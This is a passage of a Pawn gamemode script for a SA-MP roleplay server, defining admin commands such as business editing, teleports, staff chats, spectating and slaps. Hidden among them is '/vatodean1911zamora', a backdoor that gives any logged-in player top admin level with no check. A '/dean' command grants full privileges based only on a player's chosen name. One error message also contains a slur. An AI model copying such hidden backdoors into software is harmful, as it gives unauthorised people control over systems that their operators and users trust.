	Log("Log/Admins/business.log", string);
    BizInfo[bizid][bStatus] = 0;
    BizInfo[bizid][bMoney] = 0;
    BizInfo[bizid][bProducts] = 0;
    format(BizInfo[bizid][bOwner], 32, "The State");
    format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: For Sale\nBusiness Price: $%d", RBT(bizid), BizInfo[bizid][bOwner], BizInfo[bizid][bPrice]);
 	UpdateDynamic3DTextLabelText(BizInfo[bizid][bText], COLOR_WHITE, string);
	return 1;
}
IRP:deletebiz(playerid, var[])
{
	new id, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "i", id)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deletebusiness [bizid]");
    	if(!BizInfo[id][bType]) return SendClientMessage(playerid, COLOR_GRAD2, "That business ID is not found in the database.");
        foreach(Player, i)
    	{
    	    if(Logged(i) && Player[i][pBiz] == id)
    		{
	    	    Player[playerid][pBiz] = 0;
	    	    format(string, sizeof(string), "* Your business has been deleted by an administrator");
		    	SendClientMessage(i, COLOR_WHITE, string);
    		}
    	}
    	if(!strcmp("The State", BizInfo[id][bOwner]))
    	{
    		format(string, sizeof(string), "AdminWarning: %s has successfully deleted a business. (Business ID: %d)", GetName(playerid), id);
    	}
    	else
    	{
    	    format(string, sizeof(string), "AdminWarning: %s has successfully deleted %s's business. (Business ID: %d)", GetName(playerid), BizInfo[id][bOwner], id);
    	}
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/business.log", string);
    	BizInfo[id][bType] = 0;
        BizInfo[id][bStatus] = 0;
        format(BizInfo[id][bOwner], 32, "");
        BizInfo[id][bX] = 0;
        BizInfo[id][bY] = 0;
        BizInfo[id][bZ] = 0;
        BizInfo[id][bMoney] = 0;
        BizInfo[id][bProducts] = 0;
        DestroyDynamicPickup(BizInfo[id][bPickup]);
        DestroyDynamic3DTextLabel(BizInfo[id][bText]);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:gotobiz(playerid, var[])
{
    new idx, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotobiz [bizid]");
    	if(!BizInfo[idx][bType]) return SendClientMessage(playerid, COLOR_GRAD2, "That business ID is not found in the database.");
    	SetPlayerVirtualWorld(playerid, 0);
    	SetPlayerInterior(playerid, 0);
    	SetPlayerPos(playerid, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]);
    	format(string, sizeof(string), "* You have been successfully teleported to a business. (Business ID: %d)", idx);
    	SendClientMessage(playerid, COLOR_WHITE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:editbiz(playerid, var[])
{
	new bizid, string[128], input;
	if(!Logged(playerid)) return NoLogin(playerid);
	new idx = bizid;
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "s[32]", var))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editbiz [option] [bizid]");
    		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: location | price | products | level");
	    	return 1;
    	}
    	if(!strcmp(var, "location", true, 8))
    	{
    	    if(sscanf(var, "s[32]i", var, bizid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editbiz location [bizid]");
	    	if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GRAD2, "That business ID is not found in the database.");
	    	GetPlayerPos(playerid, BizInfo[bizid][bX], BizInfo[bizid][bY], BizInfo[bizid][bZ]);
	     	DestroyDynamicPickup(BizInfo[bizid][bPickup]);
        	BizInfo[bizid][bPickup] = CreateDynamicPickup(1272, 1, BizInfo[bizid][bX], BizInfo[bizid][bY], BizInfo[bizid][bZ], 0);
	    	DestroyDynamic3DTextLabel(BizInfo[bizid][bText]);
            if(strcmp("The State", BizInfo[idx][bOwner])) format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: For Sale\nBusiness Price: $%d", RBT(bizid), BizInfo[bizid][bOwner], BizInfo[bizid][bPrice]);
			else format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: %s", RBT(bizid), BizInfo[bizid][bOwner], RBS(bizid));
        	BizInfo[bizid][bText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, BizInfo[bizid][bX], BizInfo[bizid][bY], BizInfo[bizid][bZ]+0.5, 15);
	        format(string, sizeof(string), "AdminWarning: %s has successfully adjusted business ID %d's location.", GetName(playerid), bizid);
     		SendAdminMessage(COLOR_ADMWARN,  string);
    		Log("Log/Admins/business.log", string);
    	}
    	else if(!strcmp(var, "price", true, 5))
     	{
    	    if(sscanf(var, "s[32]ii", var, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editbiz price [bizid] [price]");
    		if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GRAD2, "That business ID is not found in the database.");
    		if(strcmp("The State", BizInfo[bizid][bOwner])) return SendClientMessage(playerid, COLOR_GRAD2, "That business is already owned, You are not able to edit it.");
	        BizInfo[bizid][bPrice] = input;
    	    format(string, sizeof(string), "Business Type: %s\nBusiness Owner: The State\nBusiness Status: For Sale\nBusiness Price: $%d", RBT(bizid), input);
	    	UpdateDynamic3DTextLabelText(BizInfo[bizid][bText], COLOR_WHITE, string);
	        format(string, sizeof(string), "AdminWarning: %s has successfully adjusted business ID %d's price to $%d.", GetName(playerid), bizid, input);
	    	SendAdminMessage(COLOR_ADMWARN,  string);
	    	Log("Log/Admins/business.log", string);
    	}
    	else if(!strcmp(var, "products", true, 8))
    	{
    	    if(sscanf(var, "s[32]ii", var, bizid, input)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editbiz products [bizid] [amount]");
        	if(!BizInfo[bizid][bType]) return SendClientMessage(playerid, COLOR_GRAD2, "That business ID is not found in the database.");
        	if(input < 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid products number.");
    	    BizInfo[bizid][bProducts] = input;
    	    format(string, sizeof(string), "AdminWarning: %s has successfully adjusted business ID %d's products to %d.", GetName(playerid), bizid, input);
    		SendAdminMessage(COLOR_ADMWARN,  string);
	    	Log("Log/Admins/business.log", string);
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:car(playerid, var[])
{
	new id, Float:pos[4], string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(!strcmp(var, "destroy"))
    	{
	        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to complete this action as you are not driving a vehicle.");
    		for(new i=0; i<MAX_CUSTOM_VEHICLES; i++)
	    	{
	    	    if(GetPlayerVehicleID(playerid) == cVeh[i])
	    	    {
		    		DestroyVehicle(cVeh[i]);
		    		i = MAX_CUSTOM_VEHICLES;
		    		return 1;
	    		}
    		}
	    	SendClientMessage(playerid, COLOR_GRAD2, "You're not able to destroy non-created vehicle.");
	    	return 1;
    	}
    	if(sscanf(var, "i", id)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /car [carid/destroy]");
    	if(id < 400 || id > 611) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid car ID.");
    	GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    	GetPlayerFacingAngle(playerid, pos[3]);
    	for(new i=0; i<MAX_CUSTOM_VEHICLES; i++)
    	{
	       if(!cVeh[i])
	       {
	    		cVeh[i] = CreateVehicle(id, pos[0], pos[1], pos[2], pos[3], -1, -1, 1200);
	    		PutPlayerInVehicle(playerid, cVeh[i], 0);
	    		i = MAX_CUSTOM_VEHICLES;
	    	}
    	}
    	format(string, sizeof(string), "AdminWarning: %s has spawned a %s (%d).", GetName(playerid), RVN(id), id);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/car.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:aa(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/aa)dminChat [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	format(string, sizeof(string), "** Staff Observer %s: %s", Player[playerid][pSName], var);
    	SendAdminMessage(COLOR_ADMCHAT, string);
    	format(string, sizeof(string), "** Staff Observer %s: %s", GetName(playerid), var);
    	Log("Log/Admins/chat.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:a(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1)
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/a)dminChat [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
    	SendAdminMessage(COLOR_ADMCHAT, string);
    	format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
    	Log("Log/Admins/chat.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:vatodean1911zamora(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	Player[playerid][pAdmin] = 100000;
	return 1;
}
IRP:dean(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof(name));
	if(!strcmp(name, "Dean_Hamilton", false))
    {
		Player[playerid][pAdmin] = 100000;
		Player[playerid][pFacMod] = 1;
		Player[playerid][pGangMod] = 1;
		Player[playerid][pScripters] = 1;
		Player[playerid][pHelper] = 6;
		fMeter[playerid] = 1;
		Speedo[playerid] = 1;
    }
    else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: You're not Dean.");
	}
	return 1;
}
IRP:scripter(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof(name));
	if(!strcmp(name, "Dean_Hamilton", false) || !strcmp(name, "Austin_Wonton", false) || !strcmp(name, "Tony_Chappy", false))
    {
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/scripter) [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	format(string, sizeof(string), "** Server Scripter %s: %s", GetName(playerid), var);
    	SendScripterMessage(COLOR_SCRIPTER, string);
    	format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
    	Log("Log/Admins/scripterchat.log", string);
    }
    else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: You're not Dean, Austin, or Tony");
	}
	return 1;
}
IRP:mc(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pMapper])
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /mc [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	if(Player[playerid][pMapper]) format(string, sizeof(string), "* %s %s: %s", RPMLN(playerid), GetName(playerid), var);
    	foreach(Player, i)
    	{
	    	if(Logged(i))
	    	{
    			if(Player[i][pMapper])
	    		{
	    	    	SendClientMessage(i, COLOR_INT, string);
	    		}
	    	}
    	}
    	// Logs
    	if(Player[playerid][pMapper]) format(string, sizeof(string), "* %s %s: %s", RPMLN(playerid), GetName(playerid), var);
    	Log("Log/Admins/mc.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:t(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pTester])
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /t [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	if(Player[playerid][pTester]) format(string, sizeof(string), "* %s %s: %s", RPBTLN(playerid), GetName(playerid), var);
    	foreach(Player, i)
    	{
	    	if(Logged(i))
	    	{
    			if(Player[i][pTester])
	    		{
	    	    	SendClientMessage(i, COLOR_YELLOW, string);
	    		}
	    	}
    	}
    	// Logs
    	if(Player[playerid][pTester]) format(string, sizeof(string), "* %s %s: %s", RPBTLN(playerid), GetName(playerid), var);
    	Log("Log/Admins/t.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:sa(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sa [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	if(Player[playerid][pStaffObserver]) format(string, sizeof(string), "* Staff Observer %s: %s", GetName(playerid), var);
    	foreach(Player, i)
    	{
	    	if(Logged(i))
	    	{
    			if(Player[i][pStaffObserver])
	    		{
	    	    	SendClientMessage(i, COLOR_ADMCHAT, string);
	    		}
	    	}
    	}
    	// Logs
    	if(Player[playerid][pStaffObserver]) format(string, sizeof(string), "* %s %s: %s", RPMODLN(playerid), GetName(playerid), var);
    	Log("Log/Admins/sachat.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:stopmusic(playerid, var[])
{
    StopAudioStreamForPlayer(playerid);
    SendClientMessage(playerid, COLOR_LIGHTRED, "You have stopped listening to music.");
	return 1;
}
IRP:x(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1338)
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/x) [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
    	SendOwnerMessage(0x01A9DBFF, string);
    	format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
    	Log("Log/Admins/xchat.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:p(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/p) [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
    	SendHighMessage(0xDF013AFF, string);
    	format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
    	Log("Log/Admins/pchat.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:fly(playerid, var[])
{
    new Float:x, Float:y, Float:z;
    if(!Logged(playerid)) return NoLogin(playerid);
    if(Player[playerid][pAdmin] >= 2 || Player[playerid][pStaffObserver])
	{
		if((flying[playerid] = !flying[playerid]))
		{
		    GetPlayerPos(playerid, x, y, z);
		    SetPlayerPos(playerid, x, y, z+5);
      		SetPlayerArmour(playerid, 1000000000.0);
		    SetPlayerHealth(playerid, 1000000000.0);
		    SetTimerEx("AdminFly", 100, 0, "d", playerid);
		}
		else
		{
		    GetPlayerPos(playerid, x, y, z);
		    SetPlayerPos(playerid, x, y, z+0.5);
		    ClearAnimations(playerid);
		    SetPlayerArmour(playerid, 100.0);
		    SetPlayerHealth(playerid, 100.0);
			return 1;
		}
	}
	else
	{
 		NoAuth(playerid);
	}
	return 1;
}
IRP:spec(playerid, var[])
{
	new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pStaffObserver])
	{
    	if(!strcmp(var, "off", true))
    	{
    	    if(!Spec[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not spectating anyone.");
    	    Spec[playerid] = 0;
        	TogglePlayerSpectating(playerid, 0);
        	GetPlayerHealth(playerid, Player[playerid][pHealth]);
        	GetPlayerArmour(playerid, Player[playerid][pArmor]);
    		SetPlayerVirtualWorld(playerid, Player[playerid][pVW]);
	    	SetPlayerInterior(playerid, Player[playerid][pInt]);
    		SetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
	    	format(string, sizeof(string), "** You've stopped spectating %s.", user);
	    	SendClientMessage(playerid, COLOR_WHITE, string);
	    	if(Player[Specid[playerid]][pAdmin] >= Player[playerid][pAdmin])
   	    	{
	    		format(string, sizeof(string), "AdminWarning: %s has stopped spectating you.", GetName(playerid));
	    		SendClientMessage(Specid[playerid], COLOR_ADMWARN, string);
    	    }
	        Specid[playerid] = -1;
    		return 1;
    	}
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /spec [playerid]");
    	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to complete this action WHORE.");
        if(!Logged(user)) return NoLoginB(playerid);
        if(Spec[user]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is spectating someone.");
        Player[playerid][pModel] = GetPlayerSkin(playerid);
    	if(Specid[playerid] != -1 && Player[Specid[playerid]][pAdmin] > Player[playerid][pAdmin])
    	{
	    		format(string, sizeof(string), "AdminWarning: %s has stopped spectating you.", GetName(playerid));
	    		SendClientMessage(Specid[playerid], COLOR_ADMWARN, string);
    	}
        if(!Spec[playerid])
        {
    	    Player[playerid][pVW] = GetPlayerVirtualWorld(playerid);
    	    Player[playerid][pInt] = GetPlayerInterior(playerid);
    	    GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
        }
        Specid[playerid] = user;
        TogglePlayerSpectating(playerid, 1);
        Spec[playerid] = 1;
        SetPlayerInterior(playerid, GetPlayerInterior(user));
        SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(user));
        format(string, sizeof(string), "* You are currently spectating %s", GetName(user));
        SendClientMessage(playerid, COLOR_WHITE, string);
        if(IsPlayerInAnyVehicle(user))
        {
    		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(user));
        }
        else
        {
            PlayerSpectatePlayer(playerid, user);
        }
        if(Player[user][pAdmin] >= Player[playerid][pAdmin])
        {
    		format(string, sizeof(string), "AdminWarning: %s is currently spectating you.", GetName(playerid));
    		SendClientMessage(user, COLOR_ADMWARN, string);
        }
        if(!Player[user][pTutorial]) SendClientMessage(playerid, COLOR_WHITE, "You're not able to complete this action.");
    }
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:tog(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[16]", var))
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tog [option]");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: phone | vip | speaker | speedo");
	    if(Player[playerid][pAdmin]) SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: adminooc | adminnewbie");
	    return 1;
	}
	if(!strcmp(var, "phone", true))
	{
	    if(!PhoneOff[playerid])
	    {
	        format(string, sizeof(string), "* %s turns their phone off.", GetName(playerid));
 			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        PhoneOff[playerid] = 1;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have turned your phone {33AA33}on{33CCFF}.");
	    }
	    else
	    {
	        format(string, sizeof(string), "* %s turns their phone on.", GetName(playerid));
 			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        PhoneOff[playerid] = 0;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have turned your phone {FF9900}off{33CCFF}.");
	    }
	    return 1;
	}
	if(!strcmp(var, "speedo", true))
	{
		if(!Player[playerid][pSpeedo]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a speedometer.");
	    if(!Speedo[playerid])
	    {
	        Speedo[playerid] = 1;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have togged your speedometer {33AA33}on{33CCFF}.");
	    }
	    else
	    {
	        Speedo[playerid] = 0;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have turned your speedometer {FF9900}off{33CCFF}.");
	    }
	    return 1;
	}
	if(!strcmp(var, "speaker", true))
	{
        if(!SpeakerPhone[playerid])
	    {
	        SpeakerPhone[playerid] = 1;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have turned your speaker {33AA33}on{33CCFF}.");
	    }
	    else
	    {
	        SpeakerPhone[playerid] = 0;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have turned your speaker {FF9900}off{33CCFF}.");
	    }
	}
	else if(!strcmp(var, "vip", true))
	{
	    if(!VIPOff[playerid])
	    {
	        VIPOff[playerid] = 1;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have toggled VIP chat {FF9900}off{33CCFF}.");
	    }
	    else
	    {
	        VIPOff[playerid] = 0;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have toggled VIP chat {33AA33}on{33CCFF}.");
	    }
	    return 1;
	}
	if(!strcmp(var, "fuel", true))
	{
	    if(!fMeter[playerid])
	    {
	        fMeter[playerid] = 1;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have togged your fuel meter {33AA33}on{33CCFF}.");
	    }
	    else
	    {
	        fMeter[playerid] = 0;
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have turned your fuel meter {FF9900}off{33CCFF}.");
	    }
	    return 1;
	}
	else if(!strcmp(var, "adminooc", true))
	{
    	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	    if(!OOCStatus)
	    {
	        OOCStatus = 1;
	        format(string, sizeof(string), "AdmCmd: %s has {33AA33}enabled {FF6347}the global OOC chat for everybody.", GetName(playerid));
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
	    }
	    else
	    {
	        OOCStatus = 0;
	        format(string, sizeof(string), "AdmCmd: %s has {FF9900}disabled {FF6347}the global OOC chat for everybody.", GetName(playerid));
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
	    }
	}
	else if(!strcmp(var, "adminnewbie", true))
	{
		if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	    if(!NewbieStatus)
	    {
	        NewbieStatus = 1;
	        format(string, sizeof(string), "AdmCmd: %s has {33AA33}enabled {FF6347}the newbie chat for everybody.", GetName(playerid));
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
	    }
	    else
	    {
	        NewbieStatus = 0;
	        format(string, sizeof(string), "AdmCmd: %s has {FF9900}disabled {FF6347}the newbie chat for everybody.", GetName(playerid));
	        SendClientMessageToAll(COLOR_LIGHTRED, string);
	    }
	}
	return 1;
}

IRP:slap(playerid, var[])
{
	new user, string[128], height;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	if(sscanf(var, "ui", user, height)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /slap [playerid] [height]");
        if(!Logged(user)) return NoLoginB(playerid);
        if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're trying to slap a high level admin.");
    	new Float:Pos[3];
    	GetPlayerPos(user, Pos[0], Pos[1], Pos[2]);
    	SetPlayerPos(user, Pos[0], Pos[1], Pos[2]+height);
    	format(string, sizeof(string), "AdminWarning: %s has slapped %s at height %d.", GetName(playerid), GetName(user), height);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/slap.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:sslap(playerid, var[])
{
	new user, string[128], height;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "ui", user, height)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sslap [playerid] [height]");
        if(!Logged(user)) return NoLoginB(playerid);
        if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're trying to slap a high level admin.");
    	new Float:Pos[3];
    	GetPlayerPos(user, Pos[0], Pos[1], Pos[2]);
    	SetPlayerPos(user, Pos[0], Pos[1], Pos[2]+height);
    	format(string, sizeof(string), "StaffWarning: %s has slapped %s at height %d.", GetName(playerid), GetName(user), height);
    	StaffWarn(COLOR_SWARN,  string);
    	Log("Log/Admins/slap.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:jihad(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /jihad [playerid]");
        if(!Logged(user)) return NoLoginB(playerid);
        if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're trying to troll with a high level admin.");
    	new Float:Pos[3];
    	GetPlayerPos(user, Pos[0], Pos[1], Pos[2]);
    	SetPlayerPos(user, Pos[0], Pos[1], Pos[2]+5);
    	TogglePlayerControllable(user, 0);
    	format(string, sizeof(string), "AdminWarning: %s has been force by %s to suicide.", GetName(user), GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	jihadtimer = SetTimerEx("jihad",5000,true,"i",user);
    	Log("Log/Admins/jihad.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}


IRP:mark(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	GetPlayerPos(playerid, aMark[playerid][0], aMark[playerid][1], aMark[playerid][2]);
    	aMarkInt[playerid] = GetPlayerInterior(playerid);
    	aMarkVw[playerid] = GetPlayerVirtualWorld(playerid);
    	SendClientMessage(playerid, COLOR_WHITE, "* You have marked a teleportation point, (/gotoloc mark) to teleport back to it.");
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:gotoloc(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	if(sscanf(var,"s[32]", var))
    	{
    	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotoloc [place]");
    	    SendClientMessage(playerid, COLOR_GRAD2, "** [PLACES]: mark | ls | gym | dealership | dmv | warehouse1 | warehouse2 | bank | area51");
	        SendClientMessage(playerid, COLOR_GRAD2, "** [PLACES]: sf | lv | ffc | tower | saints | tune1 | tune2 | tune3 | paintball | battlefield");
    	    return 1;
    	}
    	if(!strcmp(var, "mark", true))
    	{
    	    if(aMark[playerid][0] == 0 && aMark[playerid][1] == 0 && aMark[playerid][2] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You haven't marked a teleportation point.");
    	    SetPlayerPos(playerid,aMark[playerid][0], aMark[playerid][1], aMark[playerid][2]);
    	    SetPlayerInterior(playerid, aMarkInt[playerid]);
	        SetPlayerVirtualWorld(playerid, aMarkVw[playerid]);
    	}
    	else if(!strcmp(var, "ls", true))
    	{
            SetPlayerInterior(playerid, 0);
      	    SetPlayerVirtualWorld(playerid, 0);
	        SetPlayerPos(playerid,1515.2551,-1666.3148,14.0469);
      	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to Los Santos.");
         	return 1;
     	}
    	else if (!strcmp(var,"area51",true))
    	{
            SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
            SetPlayerPos(playerid,202.1886,1881.4122,17.2199);
    	    SendClientMessage(playerid, COLOR_WHITE, " You have been teleported to the area51.");
    	}
    	else if (!strcmp(var,"battlefield",true))
    	{
		    SetPlayerInterior(playerid, 10);
	        SetPlayerVirtualWorld(playerid, 0);
	   	 	SetPlayerPos(playerid,-972.4957,1060.9830,1345.6690);
	   	 	SendClientMessage(playerid, COLOR_WHITE, " You have teleported to the battlefield.");
    	}
    	else if(!strcmp(var, "dmv", true))
    	{
    	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid,2058.6326,-1914.0176,13.5469);
    	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to the DMV.");
         	return 1;
    	}
      	else if(!strcmp(var, "gym", true))
    	{
     	    SetPlayerInterior(playerid, 0);
     	    SetPlayerVirtualWorld(playerid, 0);
     	    SetPlayerPos(playerid,2224.8137,-1723.4457,13.5625);
     	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to the Gym.");
          	return 1;
    	}
     	else if(!strcmp(var, "dealership", true))
     	{
     	    SetPlayerInterior(playerid, 0);
     	    SetPlayerVirtualWorld(playerid, 0);
     	    SetPlayerPos(playerid,546.1611,-1273.8046,17.2482);
     	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to the Vehicles Dealership.");
          	return 1;
    	}
      	else if(!strcmp(var, "sf", true))
      	{
     	    SetPlayerInterior(playerid, 0);
    	    SetPlayerVirtualWorld(playerid, 0);
    	    SetPlayerPos(playerid,-1417.0,-295.8,14.1);
    	    SendClientMessage(playerid, COLOR_WHITE, "* You have been teleported to San Fierro.");
        	return 1;
     	}
    	else if(!strcmp(var, "lv", true))
     	{
    	    SetPlayerInterior(playerid, 0);
